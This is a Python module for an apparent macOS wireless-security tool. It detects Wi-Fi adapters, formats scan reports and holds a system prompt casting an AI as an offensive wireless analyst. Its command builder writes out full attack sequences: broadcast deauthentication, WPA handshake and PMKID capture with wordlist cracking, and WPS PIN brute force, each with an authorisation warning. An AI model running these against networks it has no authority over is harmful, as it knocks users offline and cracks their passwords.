import re
import subprocess

KNOWN_ADAPTERS = {
    ("0cf3", "9271"): {
        "name": "TL-WN722N",
        "chipset": "AR9271",
        "monitor": True,
        "inject": True,
        "bands": "2.4 GHz",
        "kali_iface": "wlan0",
        "driver_note": "ath9k_htc — works out of the box on Kali.",
    },
    ("0bda", "8812"): {
        "name": "AWUS036ACH",
        "chipset": "RTL8812AU",
        "monitor": True,
        "inject": True,
        "bands": "2.4 / 5 GHz",
        "kali_iface": "wlan0",
        "driver_note": "Install driver in Kali: sudo apt install realtek-rtl88xxau-dkms",
    },
    ("0bda", "8179"): {
        "name": "TL-WN725N V3",
        "chipset": "RTL8188EU",
        "monitor": True,
        "inject": False,
        "bands": "2.4 GHz",
        "kali_iface": "wlan0",
        "driver_note": "Limited injection support — best used for passive monitoring only.",
    },
}

# Apple removed this private-framework binary in macOS 14.4; it is absent on
# current systems. Kept only so older macOS can still fall back to it. Live
# scanning now uses `system_profiler SPAirPortDataType` (see WIFI_SCAN_CMD).
AIRPORT = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

# Supported everywhere `system_profiler` exists; needs no sudo and returns the
# current association plus nearby networks with signal and security.
WIFI_SCAN_CMD = ["system_profiler", "SPAirPortDataType", "-json"]


def _hex_id(raw) -> str:
    """Extract a 4-hex-digit USB id from values like '0x0bda  (Realtek …)'.

    macOS `system_profiler SPUSBDataType` appends the vendor name to the id, so
    a plain ``.replace('0x','')`` left the appended text in place and no known
    adapter ever matched. Pull the hex quartet instead.
    """
    match = re.search(r"[0-9a-fA-F]{4}", str(raw or ""))
    return match.group(0).lower() if match else ""


def _signal_dbm(raw) -> tuple[int | None, int | None]:
    """Split 'spairport_signal_noise' ('-31 dBm / -99 dBm') into (rssi, noise)."""
    nums = re.findall(r"-?\d+", str(raw or ""))
    rssi = int(nums[0]) if nums else None
    noise = int(nums[1]) if len(nums) > 1 else None
    return rssi, noise


def _security_label(raw) -> str:
    """Map a 'spairport_security_mode_*' token to a short human label."""
    text = str(raw or "").lower()
    if "wpa3" in text:
        return "WPA3"
    if "wpa2" in text:
        return "WPA2"
    if "wpa" in text:
        return "WPA"
    if "wep" in text:
        return "WEP"
    if "none" in text or "open" in text:
        return "Open"
    return "Unknown"


def format_wifi_report(data: dict, mode: str = "Scan Networks") -> str:
    """Render a readable Wi-Fi report from `system_profiler SPAirPortDataType -json`.

    macOS no longer exposes per-network BSSIDs or a full active RSSI scan to this
    API, so the report states that plainly rather than implying data it does not
    have. Only real Wi-Fi interfaces (with a current network or nearby list) are
    shown; virtual interfaces such as awdl0 are skipped.
    """
    interfaces = ((data or {}).get("SPAirPortDataType") or [{}])[0].get(
        "spairport_airport_interfaces") or []
    lines = [
        "macOS Wi-Fi report (system_profiler SPAirPortDataType)",
        "Note: macOS does not expose per-network BSSIDs or a full RSSI sweep to "
        "this API; signal is shown where macOS reports it.",
        "",
    ]
    any_wifi = False
    for iface in interfaces:
        current = iface.get("spairport_current_network_information") or {}
        others = iface.get("spairport_airport_other_local_wireless_networks") or []
        if not current.get("_name") and not others:
            continue  # awdl0 / non-Wi-Fi interface
        any_wifi = True
        status = str(iface.get("spairport_status_information") or "")
        connected = "connected" in status
        lines.append(
            f"Interface {iface.get('_name', '?')} — "
            f"{'connected' if connected else 'not associated'}")
        if current.get("_name"):
            rssi, noise = _signal_dbm(current.get("spairport_signal_noise"))
            lines.append("  Current network:")
            lines.append(f"    SSID: {current.get('_name')}")
            lines.append(f"    Channel: {current.get('spairport_network_channel', '?')}")
            lines.append(
                f"    Signal: {rssi if rssi is not None else '?'} dBm"
                + (f" (noise {noise} dBm)" if noise is not None else ""))
            lines.append(f"    Security: {_security_label(current.get('spairport_security_mode'))}")
            lines.append(f"    PHY: {current.get('spairport_network_phymode', '?')}")
            if current.get("spairport_network_rate"):
                lines.append(f"    Tx rate: {current.get('spairport_network_rate')} Mbps")
        if others:
            lines.append(f"  Nearby networks ({len(others)}):")
            ranked = sorted(
                others,
                key=lambda n: _signal_dbm(n.get("spairport_signal_noise"))[0] or -999,
                reverse=True,
            )
            for net in ranked:
                rssi, _ = _signal_dbm(net.get("spairport_signal_noise"))
                lines.append(
                    f"    • {net.get('_name', '<hidden>')}  "
                    f"ch {net.get('spairport_network_channel', '?')}  "
                    f"{rssi if rssi is not None else '?'} dBm  "
                    f"{_security_label(net.get('spairport_security_mode'))}")
        lines.append("")
    if not any_wifi:
        return "[Error] No Wi-Fi interface was reported by system_profiler."
    return "\n".join(lines).rstrip()


def scan_wifi(mode: str = "Scan Networks") -> str:
    """Run the supported macOS scan and return a readable report (no sudo)."""
    import json
    try:
        proc = subprocess.run(
            WIFI_SCAN_CMD, capture_output=True, text=True, timeout=20)
    except FileNotFoundError:
        return "[Error] system_profiler was not found on this system."
    except subprocess.TimeoutExpired:
        return "[Error] system_profiler timed out."
    if proc.returncode != 0:
        return f"[Error] system_profiler failed: {proc.stderr.strip() or proc.returncode}"
    try:
        data = json.loads(proc.stdout or "{}")
    except json.JSONDecodeError:
        return "[Error] Could not parse system_profiler output."
    return format_wifi_report(data, mode)

SYSTEM_PROMPT = """You are a Wi-Fi Security Analyst embedded in Sentinel Fork — a macOS security command centre. You specialise in wireless network reconnaissance, adapter diagnostics, and offensive wireless tooling for authorised penetration testing.

─────────────────────────────────────────────
BEHAVIOUR
─────────────────────────────────────────────
When given raw output from a macOS Wi-Fi scan, interface report, signal monitor, or ping test, structure your response as follows:

1. SUMMARY
   - What the data shows in plain English
   - Interface name, hardware in use, current association status
   - Any immediately notable findings (weak signal, open networks, channel congestion)

2. NETWORK FINDINGS
   - List detected networks with SSID, BSSID, channel, signal strength (RSSI → quality %), security type
   - Flag open networks, WEP networks, or duplicate SSIDs (Evil Twin indicators)
   - Channel utilisation: which channels are congested, which are clear
   - Recommend channel changes if applicable

3. SECURITY OBSERVATIONS
   - Encryption types present (Open / WEP / WPA / WPA2 / WPA3)
   - Any anomalies: hidden SSIDs, unusually strong signals from unknown BSSIDs, deauth frames
   - Signal quality assessment: RSSI to percentage conversion (−30 dBm = 100 %, −90 dBm = 0 %)

4. RECOMMENDATIONS
   - Specific, actionable next steps
   - If a Kali adapter is connected: suggest relevant aircrack-ng commands for authorised testing
   - Network hardening advice for the target environment

─────────────────────────────────────────────
KALI COMMAND GENERATION
─────────────────────────────────────────────
When asked to generate Kali Linux commands, always:
- Number each step clearly
- Include the exact command with correct flags
- Add a one-line comment (# ...) explaining what each step does
- Note prerequisites (adapter in monitor mode, root access, driver installation)
- Include a ⚠️ WARNING: Only run these commands on networks you own or have written authorisation to test.

─────────────────────────────────────────────
TONE AND STANDARDS
─────────────────────────────────────────────
- Be precise and technical. Assume the user knows networking basics.
- Always include the authorisation disclaimer for offensive commands.
- Convert RSSI dBm values to percentage where helpful: quality = 2 × (RSSI + 100), clamped 0–100.
- Use tables where scan data has multiple fields (SSID, BSSID, CH, RSSI, Security).
"""


def detect_usb_adapters() -> list[dict]:
    """Scan USB bus for known Wi-Fi adapter VID/PID pairs. Returns list of adapter dicts."""
    try:
        result = subprocess.run(
            ["system_profiler", "SPUSBDataType", "-json"],
            capture_output=True, text=True, timeout=10,
        )
        import json
        data = json.loads(result.stdout)
        found = []
        _walk_usb(data, found)
        return found
    except Exception as e:
        return [{"error": str(e)}]


def parse_hardware_ports(output: str, default_interface: str = "") -> list[dict]:
    """Parse macOS networksetup output into display-safe interface records."""
    records = []
    current: dict[str, str | bool] = {}
    for raw_line in output.splitlines() + [""]:
        line = raw_line.strip()
        if not line:
            if current.get("device"):
                device = str(current["device"])
                current["default_route"] = device == default_interface
                current["role"] = (
                    "Internet / control" if device == default_interface
                    else "Built-in diagnostics" if "wi-fi" in str(current.get("hardware_port", "")).lower()
                    else "Available interface"
                )
                records.append(current)
            current = {}
        elif line.startswith("Hardware Port:"):
            current["hardware_port"] = line.split(":", 1)[1].strip()
        elif line.startswith("Device:"):
            current["device"] = line.split(":", 1)[1].strip()
    return records


def network_interface_status() -> list[dict]:
    """Read interface roles without changing mode, routes or connectivity."""
    ports = subprocess.run(
        ["networksetup", "-listallhardwareports"], capture_output=True, text=True, timeout=8
    )
    route = subprocess.run(
        ["route", "-n", "get", "default"], capture_output=True, text=True, timeout=8
    )
    match = re.search(r"^\s*interface:\s*(\S+)", route.stdout, re.MULTILINE)
    return parse_hardware_ports(ports.stdout, match.group(1) if match else "")


def build_connection_preflight(interfaces: list[dict], adapters: list[dict]) -> dict:
    """Assess the safe dual-interface arrangement; never modify the system."""
    valid_adapters = [a for a in adapters if a and "error" not in a]
    internet = [i for i in interfaces if i.get("default_route")]
    lines = ["CONNECTION PREFLIGHT (read-only)", "Sentinel did not change any interface or mode.", ""]
    if interfaces:
        lines.append("Interfaces and planned roles:")
        for item in interfaces:
            lines.append(
                f"• {item.get('device', '?')} — {item.get('hardware_port', 'Unknown')}: "
                f"{item.get('role', 'Available interface')}"
            )
    else:
        lines.append("• No macOS interface details were available.")
    lines.append("")
    if valid_adapters:
        names = ", ".join(a.get("name", "Unknown USB adapter") for a in valid_adapters)
        lines.append(f"USB monitor adapter detected: {names}")
    else:
        lines.append("USB monitor adapter: none of Sentinel's known models detected.")
    if internet and valid_adapters:
        level = "ready"
        lines.append("Recommended arrangement is available: keep the routed interface for internet/control and pass the USB adapter to Kali for monitor mode.")
    elif valid_adapters:
        level = "warning"
        lines.append("WARNING: No separate routed internet/control interface was detected. Monitor mode or VM passthrough could leave this machine without a network connection.")
    else:
        level = "info"
        lines.append("Built-in Wi-Fi can still run Sentinel's macOS diagnostics. Kali monitor/injection work needs a supported external USB adapter.")
    lines.extend([
        "",
        "A single adapter in monitor mode cannot also maintain an ordinary Wi-Fi connection.",
        "In a Kali VM, attach the USB adapter to the guest; this detaches it from macOS. Driver and passthrough support depend on the adapter, hypervisor and Kali kernel.",
        "Sentinel only prepares commands. Review them and make every mode/disconnection change yourself on an authorised network.",
    ])
    return {"level": level, "text": "\n".join(lines), "has_internet": bool(internet), "has_usb": bool(valid_adapters)}


def _walk_usb(node, found: list):
    if isinstance(node, dict):
        vid = _hex_id(node.get("vendor_id"))
        pid = _hex_id(node.get("product_id"))
        key = (vid, pid)
        if key in KNOWN_ADAPTERS:
            info = dict(KNOWN_ADAPTERS[key])
            info["usb_name"] = node.get("_name", "Unknown")
            found.append(info)
        for v in node.values():
            _walk_usb(v, found)
    elif isinstance(node, list):
        for item in node:
            _walk_usb(item, found)


def _safe_bssid(bssid: str) -> str:
    """A BSSID or "" — only a well-formed MAC survives, so nothing else can be
    interpolated into a command the operator copies and runs as root."""
    value = (bssid or "").strip()
    return value if re.fullmatch(r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}", value) else ""


def _safe_channel(channel: str) -> str:
    """A 1-3 digit channel number or ""."""
    value = (channel or "").strip()
    return value if re.fullmatch(r"\d{1,3}", value) else ""


def _safe_essid(essid: str) -> str:
    """An ESSID safe to show in the command header, or "". The ESSID is rendered
    only in a comment line, so ordinary spaces (as in ``My WiFi``) are kept;
    control characters (which could break the comment line) and shell
    metacharacters are rejected as defence in depth."""
    value = (essid or "").strip()
    return value if value and not re.search(r"""[\x00-\x1f`$;&|<>(){}\\"']""", value) else ""


def build_kali_commands(operation: str, adapter: dict, bssid: str, channel: str, essid: str) -> str:
    iface = adapter.get("kali_iface", "wlan0")
    mon = f"{iface}mon"
    chipset = adapter.get("chipset", "")
    driver_note = adapter.get("driver_note", "")
    inject = adapter.get("inject", False)

    # Validate the operator-supplied target fields before they reach a command
    # string: only a real MAC / digit channel / metacharacter-free ESSID passes,
    # otherwise the safe placeholder is used. This both keeps the ESSID field
    # from being silently discarded and stops arbitrary text being interpolated
    # into commands the UI tells the operator to run as root.
    # Bare-word placeholders (no angle brackets): the operator must still fill
    # these in, but `<...>` would be shell redirection syntax and make the whole
    # command line a syntax error rather than an obvious placeholder.
    bssid_val = _safe_bssid(bssid) or "TARGET_BSSID"
    ch_val = _safe_channel(channel) or "CHANNEL"
    essid_val = _safe_essid(essid) or "ESSID"

    header = (
        f"# ── Kali Command Sequence ──────────────────────────────────────────\n"
        f"# Adapter : {adapter.get('name', 'Unknown')}  ({chipset})\n"
        f"# Interface: {iface}  →  monitor mode: {mon}\n"
        f"# Driver  : {driver_note}\n"
        f"# Target  : ESSID {essid_val}  ·  BSSID {bssid_val}  ·  channel {ch_val}\n"
        f"# ⚠️  WARNING: Only run on networks you own or have written authorisation to test.\n"
        f"# ────────────────────────────────────────────────────────────────────\n\n"
    )

    if operation == "Handshake Capture":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            ("Survey all networks (find target channel/BSSID)", f"sudo airodump-ng {mon}"),
            (
                f"Lock onto target network (Ch {ch_val}, BSSID {bssid_val})",
                f"sudo airodump-ng -c {ch_val} --bssid {bssid_val} -w capture {mon}",
            ),
            (
                "Force a deauth to capture WPA handshake (run in a second terminal)",
                f"sudo aireplay-ng -0 10 -a {bssid_val} {mon}",
            ),
            (
                "Crack captured handshake against wordlist",
                "sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt",
            ),
            ("Restore adapter to managed mode when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "Deauth Attack":
        if not inject:
            return header + f"# ❌ {adapter.get('name')} ({chipset}) does not support packet injection.\n# Use TL-WN722N or AWUS036ACH for deauth attacks.\n"
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            (
                f"Monitor target to identify connected clients",
                f"sudo airodump-ng -c {ch_val} --bssid {bssid_val} {mon}",
            ),
            (
                "Deauth all clients from AP (broadcast — replace with client MAC for targeted)",
                f"sudo aireplay-ng -0 0 -a {bssid_val} {mon}",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "WPS Audit":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            ("Scan for WPS-enabled access points", f"sudo wash -i {mon}"),
            (
                f"Run Reaver WPS PIN brute-force against target ({bssid_val})",
                f"sudo reaver -i {mon} -b {bssid_val} -vv",
            ),
            (
                "Alternative: Bully (often faster on locked APs)",
                f"sudo bully {mon} -b {bssid_val} -v 3",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "PMKID Attack":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            (
                "Capture PMKID frames (no client deauth needed — runs passively)",
                f"sudo hcxdumptool -o pmkid.pcapng -i {mon} --enable_status=1",
            ),
            (
                "Convert capture to hashcat format",
                "sudo hcxpcapngtool -o hash.hc22000 -E essidlist pmkid.pcapng",
            ),
            (
                "Crack with hashcat (mode 22000)",
                "sudo hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    else:
        steps = []

    lines = []
    for i, (comment, cmd) in enumerate(steps, 1):
        lines.append(f"# Step {i}: {comment}")
        lines.append(cmd)
        lines.append("")

    return header + "\n".join(lines)


class WiFiAgent:
    def __init__(self):
        self.name = "wifi"

    def build_messages(self, prompt: str) -> list[dict]:
        return [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ]
